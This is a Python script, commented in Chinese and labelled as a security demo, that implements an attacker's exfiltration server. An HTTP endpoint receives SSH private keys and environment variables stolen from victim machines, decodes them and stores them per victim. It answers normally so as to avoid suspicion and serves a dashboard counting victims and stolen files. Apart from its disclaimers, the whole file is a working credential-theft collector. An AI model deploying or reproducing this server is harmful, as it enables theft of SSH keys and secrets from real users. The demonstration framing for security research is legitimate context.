#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
server.py - 恶意数据接收服务器（演示用）

WARNING: 此服务器是用于接收窃取数据的恶意代码演示。
仅在授权的安全测试环境中使用。未经授权使用是违法行为。

此服务器演示攻击者如何接收和存储从受害者机器窃取的SSH密钥。
"""

import json
import base64
import os
import socket
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from pathlib import Path
from urllib.parse import parse_qs

# 全局统计
exfiltrated_count = 0
victim_count = 0
victims = set()


class ExfiltrateHandler(BaseHTTPRequestHandler):
    """处理窃取数据请求"""

    def log_message(self, format, *args):
        """禁用默认日志"""
        pass

    def do_GET(self):
        """处理GET请求 - 显示控制面板"""
        if self.path == '/':
            self.send_dashboard()
        else:
            self.send_error(404)

    def do_POST(self):
        """处理POST请求 - 接收窃取的数据"""
        if self.path == '/exfiltrate':
            self.handle_exfiltration()
        else:
            self.send_error(404)

    def handle_exfiltration(self):
        """处理窃取的数据"""
        global exfiltrated_count, victim_count

        try:
            # 读取请求体
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)

            # 解析JSON
            data = json.loads(body.decode('utf-8'))

            # 获取客户端IP
            client_ip = self.client_address[0]

            # 判断数据类型
            if data.get('type') == 'env_vars':
                self._handle_env_vars(client_ip, data)
            else:
                self._handle_ssh_keys(client_ip, data)

            # 返回正常响应以避免引起怀疑
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        except json.JSONDecodeError:
            self.send_error(400, 'Invalid JSON')
        except Exception as e:
            print(f"[!] 处理请求时出错: {e}")
            self.send_error(500)

    def _handle_ssh_keys(self, client_ip, data):
        """处理SSH密钥数据"""
        global exfiltrated_count, victim_count

        username = data.get('username', 'unknown')
        hostname = data.get('hostname', 'unknown')
        ssh_keys = data.get('ssh_keys', [])

        # 记录受害者
        victim_key = f"{username}@{hostname}"
        if victim_key not in victims:
            victims.add(victim_key)
            victim_count += 1

        # 创建保存目录
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        victim_dir = Path('stolen_data') / f'victim-{victim_count}-{timestamp}'
        victim_dir.mkdir(parents=True, exist_ok=True)

        # 保存元数据
        metadata = {
            'hostname': hostname,
            'username': username,
            'client_ip': client_ip,
            'timestamp': time.time(),
            'key_count': len(ssh_keys),
            'server_time': datetime.now().isoformat()
        }
        (victim_dir / 'metadata.json').write_text(
            json.dumps(metadata, indent=2, ensure_ascii=False)
        )

        # 保存每个SSH密钥文件
        for i, key in enumerate(ssh_keys):
            try:
                # 解码Base64
                decoded_content = base64.b64decode(key.get('content', ''))

                # 保存私钥
                key_filename = key.get('filename', 'unknown')
                key_file = victim_dir / f'{i:02d}-{Path(key_filename).name}'
                key_file.write_bytes(decoded_content)

                # 保存密钥信息
                info_data = {
                    'original_path': key.get('file', ''),
                    'filename': key_filename,
                    'size': key.get('size', 0),
                    'decoded_size': len(decoded_content)
                }
                info_file = victim_dir / f'{i:02d}-{Path(key_filename).name}.info'
                info_file.write_text(
                    json.dumps(info_data, indent=2, ensure_ascii=False)
                )

                exfiltrated_count += 1
            except Exception as e:
                print(f"[!] 保存密钥失败: {e}")

        # 打印警告信息
        print("╔════════════════════════════════════════════════════════════╗")
        print("║ [!] 检测到SSH密钥窃取事件                                  ║")
        print("╠════════════════════════════════════════════════════════════╣")
        print(f"║ 受害者: {username}@{hostname}")
        print(f"║ 来源IP: {client_ip}")
        print(f"║ 密钥数量: {len(ssh_keys)}")
        print(f"║ 保存位置: {victim_dir}")
        print("╚════════════════════════════════════════════════════════════╝")

        for key in ssh_keys:
            print(f"    └─ 窃取文件: {key.get('filename', 'unknown')} ({key.get('size', 0)} 字节)")

    def _handle_env_vars(self, client_ip, data):
        """处理环境变量数据"""
        env_vars = data.get('data', [])

        # 保存环境变量
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        filename = Path('stolen_data') / f'env-vars-{client_ip.replace(":", "_")}-{timestamp}.json'

        formatted_data = json.dumps(data, indent=2, ensure_ascii=False)
        filename.write_text(formatted_data)

        print(f"[!] 收到环境变量数据: {len(env_vars)} 个变量")
        for item in env_vars[:10]:  # 只显示前10个
            key = item.get('key', '')
            value = item.get('value', '')
            display_value = value[:20] + '...' if len(value) > 20 else value
            print(f"    {key} = {display_value}")
        if len(env_vars) > 10:
            print(f"    ... 还有 {len(env_vars) - 10} 个变量")

    def send_dashboard(self):
        """发送Web控制面板"""
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>恶意数据接收控制台</title>
    <style>
        body {{ font-family: 'Consolas', 'Monaco', monospace; background: #1a1a1a; color: #00ff00; padding: 20px; margin: 0; }}
        .container {{ max-width: 800px; margin: 0 auto; }}
        h1 {{ color: #ff0000; text-align: center; margin-bottom: 30px; }}
        .stats {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }}
        .stat-box {{ background: #2a2a2a; padding: 30px; border: 2px solid #ff0000; border-radius: 8px; }}
        .stat-number {{ font-size: 56px; color: #ff0000; text-align: center; font-weight: bold; }}
        .stat-label {{ text-align: center; margin-top: 15px; font-size: 18px; }}
        .warning {{ background: #ff0000; color: white; padding: 15px; text-align: center; margin: 20px 0; border-radius: 5px; font-weight: bold; }}
        .footer {{ text-align: center; margin-top: 40px; color: #666; font-size: 12px; }}
        .auto-refresh {{ text-align: center; color: #888; margin-top: 20px; font-size: 12px; }}
    </style>
    <script>
        setTimeout(function() {{
            location.reload();
        }}, 5000);
    </script>
</head>
<body>
    <div class="container">
        <h1>⚠️ 恶意数据接收控制台</h1>
        <div class="warning">此服务器仅用于安全研究演示</div>
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{victim_count}</div>
                <div class="stat-label">受害主机数量</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{exfiltrated_count}</div>
                <div class="stat-label">窃取文件数量</div>
            </div>
        </div>
        <div class="auto-refresh">页面每5秒自动刷新</div>
        <div class="footer">
            警告：未经授权访问他人计算机系统是违法行为<br>
            仅在授权的安全测试环境中使用
        </div>
    </div>
</body>
</html>'''

        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))


def get_local_ip():
    """获取本地IP地址"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return 'localhost'


def main():
    """主函数"""
    # 创建数据保存目录
    Path('stolen_data').mkdir(exist_ok=True)

    # 获取端口配置
    port = int(os.environ.get('PORT', 8080))

    # 创建服务器
    server = HTTPServer(('0.0.0.0', port), ExfiltrateHandler)

    # 打印启动信息
    print("╔════════════════════════════════════════════════════════════╗")
    print("║        恶意数据接收服务器 - 安全研究演示                     ║")
    print("╠════════════════════════════════════════════════════════════╣")
    print("║ 警告: 此服务器仅用于授权的安全测试                         ║")
    print("║       未经授权使用是违法行为                               ║")
    print("╠════════════════════════════════════════════════════════════╣")
    print(f"║ 监听地址: http://0.0.0.0:{port}")
    print(f"║ 本地访问: http://localhost:{port}")
    print(f"║ 数据目录: ./stolen_data/")
    print(f"║ 控制面板: http://localhost:{port}/")
    print("╚════════════════════════════════════════════════════════════╝")
    print()
    print("[*] 等待受害者连接...")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] 服务器已停止")
        server.shutdown()


if __name__ == '__main__':
    main()
